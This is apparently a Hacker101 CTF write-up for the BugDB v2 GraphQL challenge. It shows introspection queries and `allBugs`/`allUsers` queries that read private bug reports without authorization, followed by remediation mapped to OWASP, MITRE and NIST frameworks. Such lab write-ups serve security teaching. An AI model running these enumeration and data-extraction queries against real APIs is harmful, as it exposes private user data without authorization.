# BugDB v2: Writeup (1/1)

**Difficulty:** Easy  
**Category:** Web, GraphQL  
**Flags:** 1/1 (complete)  
**Platform:** Hacker101 CTF  
**Hint:** "What has changed since last version?"

---

## Challenge Overview

**Context:** Second version of the GraphQL bug reports API. The developer "fixed" some things from v1, but the schema changed in a way that created a new, even more direct access route to private bugs.

**What you face:** The same GraphQL API, but with a slightly different schema. The `allUsers` endpoint may no longer exist, but `allBugs` was added: and it returns bugs from all users, including private ones, without authentication.

**Vulnerabilities exploited:**
- Unrestricted GraphQL Introspection (OWASP API9): reveals the new schema including `allBugs`
- Broken Object Level Authorization / BOLA (CWE-639): `allBugs` exposes private bugs from all users without authentication
- Accidental data exposure via schema change: the "fix" created a new leak

**What you learn:**
- GraphQL schema changes can introduce new vulnerabilities even while fixing old ones
- `allBugs` with `private` and `text` fields and no authorization filter = direct exfiltration
- Always retest after API refactoring: the vector changes, the vulnerability remains
- Introspection quickly reveals what changed between versions of the same API

---

## Objective

Adapt BugDB v1 queries to the new schema to extract private bug reports.

## Differences from v1

- Some fields were renamed or removed
- New `allBugs` endpoint exposed directly
- `user` query restructured (relationship with bugs modified)
- Same authorization problem remains

---

## Flag 0: Query Adaptation + allBugs

### Step 1: Check what changed with introspection

Use the same introspection queries from v1 to map the new schema:

```graphql
query {
  __schema {
    types {
      name
    }
  }
}
```

Compare available types with v1 to identify what was added/removed.

### Step 2: User query (adapted)

```graphql
query {
  allUsers {
    edges {
      node {
        id
        username
      }
    }
  }
}
```

### Step 3: Direct query for all bugs

In v2, the `allBugs` endpoint exposes data directly without going through users:

```graphql
query {
  allBugs {
    reporter {
      id
      username
    }
    private
    text
    reporterId
  }
}
```

The `text` field of private bugs (`private: true`) contains the flag.

### Step 4: Combined query (if needed)

```graphql
{
  user {
    edges {
      node {
        id
        username
        bugs {
          edges {
            node {
              text
              private
              reporter {
                id
              }
            }
          }
        }
      }
    }
  }
  allBugs {
    reporter {
      id
    }
    reporterId
    id
    text
    private
  }
}
```

---

## Attack Strategy

1. Try the v1 queries exactly: some will likely fail with errors
2. Use the error messages to understand what changed in the schema
3. Adapt the queries using introspection of the new schema
4. Explore the new `allBugs` endpoint that exposes data more directly

---

## Lessons Learned

1. **Schema updates** do not automatically fix authorization problems
2. **New endpoints** introduced in updated versions may be less protected
3. **Version comparison** reveals new or simplified attack vectors
4. **GraphQL error messages** help identify schema changes

## MITRE ATT&CK Mapping

| ID | Technique | Tactic | How it was used |
|----|-----------|--------|----------------|
| T1190 | Exploit Public-Facing Application | Initial Access | GraphQL schema analysis to discover mutations and hidden fields |
| T1087.001 | Account Discovery: Local Account | Discovery | Enumerated users and their attachments via modified queries |
| T1530 | Data from Cloud Storage Object | Collection | Read private bug attachments via IDOR on `allBugs` |
| T1565.001 | Data Manipulation: Stored Data Manipulation | Impact | Potential modification of bug data via unauthorized mutations |

## Remediation and Containment

### Technical Fixes

- Same recommendations as v1: disable introspection, add field-level authorization
- Review **all new endpoints** added during schema refactoring
- Treat a version update as an attack surface change, not just an improvement

### OWASP Top 10 2021

| ID | Category | Relevance |
|----|----------|-----------|
| A01:2021 | Broken Access Control | IDOR on allBugs queries; unauthorized access to private bugs |
| A05:2021 | Security Misconfiguration | Schema changes exposed new endpoints without access control review |

### OWASP API Security Top 10 2023

| ID | Category | Relevance |
|----|----------|-----------|
| API1:2023 | Broken Object Level Authorization | `allBugs` returns all bugs without ownership validation |
| API3:2023 | Broken Object Property Level Authorization | Private fields accessible via the new schema endpoint |
| API5:2023 | Broken Function Level Authorization | New `allBugs` endpoint available without privilege checks |

### MITRE D3FEND Countermeasures

| ID | Technique | Application |
|----|-----------|-------------|
| D3-ACL | Access Control List | Enforce per-object authorization; validate ownership on every resolver |
| D3-AL | Audit Logging | Log all GraphQL operations with full context for forensic review |

### NIST CSF 2.0

| Function | Category | Application |
|----------|----------|-------------|
| PR (Protect) | PR.AC | Authorization on all queries, including newly added endpoints |
| PR (Protect) | PR.DS | Protect sensitive bug reports from unauthorized access |
| DE (Detect) | DE.CM | Detect anomalous query patterns targeting new schema endpoints |

### NIST SP 800-53 Rev. 5

| Control | Title | Application |
|---------|-------|-------------|
| AC-3 | Access Enforcement | Per-object authorization on all GraphQL resolvers |
| AC-6 | Least Privilege | Restrict new endpoints to authorized roles only |
| CM-7 | Least Functionality | Remove or restrict introspection; audit all schema changes |
| SA-11 | Developer Testing and Evaluation | Regression testing for authorization on every schema update |

### C2M2

| Domain | Practice | MIL | Application |
|--------|----------|-----|-------------|
| ACCESS | Access Control Management | MIL-2 | Enforce BOLA checks on all endpoints, especially newly added ones |
| THREAT | Threat and Vulnerability Management | MIL-2 | Schema review on every deployment; regression testing for auth |

---

## Final Thoughts

Thanks guys!! (❍ᴥ❍ʋ)

---

BugDB v2 shows that schema changes alone do not fix broken authorization. The v1 vulnerability was BOLA via introspection; v2 changed the schema but kept the same lack of resolver-level auth checks. Real security comes from enforcing authorization at the data layer, not by hiding fields or renaming queries.

Drop by and share your own CTF experiences:

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
